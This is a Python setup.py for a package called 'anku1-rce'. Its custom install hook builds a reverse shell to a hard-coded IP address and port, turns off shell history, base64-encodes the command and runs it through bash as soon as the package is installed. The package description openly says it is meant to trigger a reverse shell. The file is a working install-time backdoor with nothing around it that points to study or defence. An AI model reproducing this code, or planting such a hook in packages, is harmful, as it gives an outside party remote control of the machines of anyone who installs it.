from setuptools import setup
from setuptools.command.install import install
import base64
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        LHOST = '47.96.145.144'  # <-- Replace with actual IP
        LPORT = 8800    # <-- Replace with actual port
        reverse_shell = (
            'python3 -c "import os; import pty; import socket; '
            's = socket.socket(socket.AF_INET, socket.SOCK_STREAM); '
            's.connect((\'{LHOST}\', {LPORT})); '
            'os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); '
            'os.putenv(\'HISTFILE\', \'/dev/null\'); '
            'pty.spawn(\'/bin/bash\'); s.close();"'
        ).format(LHOST=LHOST, LPORT=LPORT)

        encoded = base64.b64encode(reverse_shell.encode("utf-8")).decode("utf-8")
        os.system(f'echo {encoded} | base64 -d | bash')

setup(
    name='anku1-rce',
    version='0.0.1',
    description="Install this module to trigger reverse shell",
    author="Object_anku_2",
    py_modules=["Object_anku_2.hello"],
    cmdclass={'install': CustomInstall}
    )
